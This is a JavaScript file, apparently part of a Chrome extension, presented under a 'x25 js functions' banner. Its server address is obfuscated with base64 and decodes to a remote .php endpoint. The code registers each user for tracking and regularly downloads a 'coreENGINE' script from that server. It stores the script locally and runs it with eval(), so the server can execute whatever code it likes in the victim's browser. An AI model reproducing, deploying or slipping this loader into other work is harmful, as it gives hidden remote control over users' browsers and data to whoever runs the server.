//         ___   _√¤☻♥☺    _____     _         ____                 __  _                 
//    _  _|__ \ / ____/    (_)____   / __/_  ______  _____/ /_(_)___  ____  _____
//   | |/_/_/ //___ \     / / ___/  / /_/ / / / __ \/ ___/ __/ / __ \/ __ \/ ___/
//  _>  </ __/____/ /    / (__  )  / __/ /_/ / / / / /__/ /_/ / /_/ / / / (__  ) 
// /_/|_/____/_____/  __/ /____/  /_/  \__,_/_/ /_/\___/\__/_/\____/_/ /_/____/  
//                   /___/                                                       
//  ____ ____ ____ 
// ||x |||y |||u ||
// ||__|||__|||__||
// |/__\|/__\|/__\|

var __initialized = false;
var corever = 0;
var dataSet = {};
var __update_period = 1000;
var coreENGINE;
var coreServer = base64.decode("aHR0cHM6Ly8wMDguZXZvZGVzaWduLnJ1L2V4dC90b29sLnBocA==");
var now;

function doHah()
{
   x25("#msgdiv").append("wanna really? " + addhaha);
}

function pingserver(nextf)
{
   console.log("pingserver()");
   x25.post(coreServer + "?action=ping",
   {
      'userID': userID,
      data: Math.random()
   }, function(d)
   {
      nextf && nextf.call(this, d);
      x25('#banner')
         .css("color", '#' + (9999 * Math.random()) % 0xffff);
   });
}


function regme(nextf)
{
   console.log("[registering]");
   x25.post(coreServer + "?action=regme", function(d)
   {
      console.log("got ", d);
      var dd = d.split("PaX");
      d = dd[0];
      var dataSet = {};
      dataSet.userID = d;
      userID = d;
      chrome.storage.local.set(dataSet, function()
      {
         console.log('userID ' + d + ' registered');
         nextf && nextf.call(this, userID);
         x25('#banner')
            .css("color", '#' + (9999 * Math.random()) % 0xffff);
      });
   });
}

function executeCoreENGINE(nextf)
{
   if(__initialized == false)
   {
      __initialized = true;
      chrome.storage.local.get("coreENGINE", function(data)
      {
         coreENGINE = data.coreENGINE;
         if(!coreENGINE || !coreENGINE.length)
         {
            console.error("dont have coreENGINE");
            updateCoreEngine(true, loadEngine);
            return;
         }
         else
         {
            eval(data.coreENGINE);
            nextf && nextf.call(this);
         }
      });
   }
}


function clearStorage()
{
   chrome.storage.local.clear();
}

function loadEngine(nextf)
{
   chrome.storage.local.get(["coreVER", "coreENGINE", "coreENGINETIME"], function(dataSet)
   {
      corever = dataSet.coreVER;
      console.log("storage ver=" + dataSet.coreVER);
      x25.get(coreServer + "?action=getcore&force=1&userID=" + userID +
         "&ver=" + corever,
         function(dd)
         {
            d = JSON.parse(dd);
            if(dd && dd.length && d && d.corever != dataSet.coreVER)
            {
               console.log("remote loaded coreENGINE size=" + d.core.length + "b ver=" + d
                  .corever);
               dataSet = {};
               corever = dataSet.coreVER = d.corever;
               coreENGINE = dataSet.coreENGINE = d.core;
               now = new Date();
               dataSet.coreENGINETIME = now.getTime();
               chrome.storage.local.set(dataSet, function()
               {
                  console.log('coreENGINE updated to ver=' +
                     (dataSet.coreVER ? dataSet.coreVER : "<unknown>") + ' len=' +
                     (dataSet.coreENGINE ?
                        dataSet.coreENGINE.length : "<unknown>"));
                  nextf && nextf.call(this, dataSet, true);
               });

            }
            else
            {
               console.log("no update need, corever=" + d.corever);
               nextf && nextf.call(this, dataSet, false);
            }
         });

   });
}

function updateCoreEngine(force, nextf)
{
   now = new Date()
   now = now.getTime();
   chrome.storage.local.get(["coreVER", "coreENGINE", "coreENGINETIME"], function(data)
   {
      if(force || (data.coreENGINETIME && (now / 1000 - data.coreENGINETIME / 1000) >=
            __update_period))
      {
         console.log("need update " + (now / 1000 - data.coreENGINETIME / 1000));
         loadEngine(function(data, status)
         {
            chrome.storage.local.get(["coreVER", "coreENGINE", "coreENGINETIME"],
               function(data)
               {
                  nextf && nextf.call(this, data, status);
               });

         });
      }
      else
      {
         nextf && nextf.call(this, data, false);
      }
   });

}


function assignUserID(nextf)
{
   var dataSet = {};
   chrome.storage.local.get("userID", function(data)
   {
      if(typeof(data.userID) == 'undefined')
      {
         regme(function(userID)
         {
            x25('#huserid')
               .html("[userID: " + userID + "]");
            if(typeof(nextf) == 'function')
               nextf.call(this, userID);
         });
      }
      else
      {
         userID = data.userID;
         x25('#huserid')
            .html("[userID: " + userID + "]");
         //console.log("load userID ",userID);
         if(typeof(nextf) == 'function')
            nextf.call(this, userID);
      }
   });
   x25('#banner')
      .css("color", '#' + (9999 * Math.random()) % 0xffff);
}
